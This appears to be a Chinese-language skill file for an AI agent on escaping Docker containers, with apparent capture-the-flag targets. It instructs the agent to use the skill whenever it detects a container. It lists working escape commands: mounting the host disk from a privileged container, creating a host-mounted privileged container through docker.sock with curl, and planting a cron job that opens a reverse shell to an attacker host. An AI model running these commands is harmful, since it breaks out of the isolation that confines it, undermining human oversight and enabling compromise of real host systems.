---
name: docker-escape
description: "Docker 容器逃逸技术。当在 Docker 容器内部需要逃逸到宿主机、发现 docker.sock 挂载、容器以特权模式运行、或需要利用容器配置错误时使用。覆盖特权容器逃逸、socket 逃逸、挂载逃逸、内核漏洞、runc 漏洞、capabilities 滥用。发现容器环境就应使用此技能"
metadata:
  tags: "docker,container,escape,逃逸,容器,privileged,docker.sock,cgroup,runc,namespace"
  category: "cloud"
---

# Docker 容器逃逸

容器不是虚拟机——它与宿主机共享内核，逃逸面比想象中大得多。

## ⛔ 深入参考（必读）

- 各种逃逸方法的完整 payload 和利用条件 → [references/escape-methods.md](references/escape-methods.md)

---

## Phase 1: 环境确认

```bash
# 确认在容器中
cat /proc/1/cgroup 2>/dev/null | grep -qi docker && echo "IN DOCKER"
ls /.dockerenv 2>/dev/null && echo "IN DOCKER"
cat /proc/1/sched | head -1    # PID 1 不是 systemd/init → 容器

# 基础信息
hostname
cat /etc/os-release
uname -r    # 内核版本（宿主机共享）
```

## Phase 2: 逃逸条件检查清单

按成功率排序检查：

```bash
# 1. 特权容器？（最简单的逃逸）
cat /proc/1/status | grep CapEff
# 0000003fffffffff = 特权容器

# 2. Docker Socket 挂载？
ls -la /var/run/docker.sock 2>/dev/null

# 3. 宿主机目录挂载？
mount | grep -v 'overlay\|proc\|sys\|cgroup\|tmpfs\|devpts\|mqueue'
cat /proc/mounts | grep -E '^/dev/'

# 4. 危险 Capabilities？
cat /proc/1/status | grep Cap
# python3 解码: python3 -c "import struct;print(bin(struct.unpack('Q',bytes.fromhex('CAPEFF_HEX'))[0]))"
# 关注: CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_DAC_OVERRIDE, CAP_NET_ADMIN

# 5. PID namespace 共享？
ls /proc/*/exe 2>/dev/null | head -20
# 能看到大量非容器进程 → hostPID=true

# 6. 网络共享？
ip addr
# 能看到宿主机网卡(eth0 有宿主机 IP) → hostNetwork=true
```

## Phase 3: 逃逸决策树

```
检查结果？
├─ 特权容器 → 挂载宿主机磁盘 / cgroup release_agent / nsenter
├─ Docker Socket → 创建特权容器逃逸
├─ hostPath 挂载 → 读写宿主机文件（写 crontab/SSH key）
├─ CAP_SYS_ADMIN → cgroup 逃逸 / mount
├─ CAP_SYS_PTRACE + hostPID → 注入宿主机进程
├─ hostNetwork → 访问宿主机服务/Metadata API
└─ 以上都没有 → 内核漏洞（CVE-2022-0847 等）
详细命令 → [references/escape-methods.md](references/escape-methods.md)
```

## Phase 4: 快速逃逸命令

### 特权容器（成功率 99%）
```bash
mkdir -p /tmp/host && mount /dev/sda1 /tmp/host
cat /tmp/host/root/flag.txt
# 或 chroot /tmp/host bash
```

### Docker Socket（成功率 95%）
```bash
# 无 docker CLI 时用 curl
curl -s --unix-socket /var/run/docker.sock \
  http://localhost/containers/json | head -3

# 创建挂载宿主机的新容器
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  http://localhost/containers/create \
  -d '{"Image":"alpine","Cmd":["cat","/mnt/root/flag.txt"],"HostConfig":{"Binds":["/:/mnt"],"Privileged":true}}'
```

### 写 Crontab 逃逸
```bash
# 如果挂载了 /etc 或 /var/spool/cron
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'" > /host_etc/cron.d/pwn
```

## 工具
| 工具 | 用途 |
|------|------|
| CDK | 容器逃逸自动化检测+利用 |
| deepce | Docker 枚举脚本 |
| amicontained | 容器环境检测 |
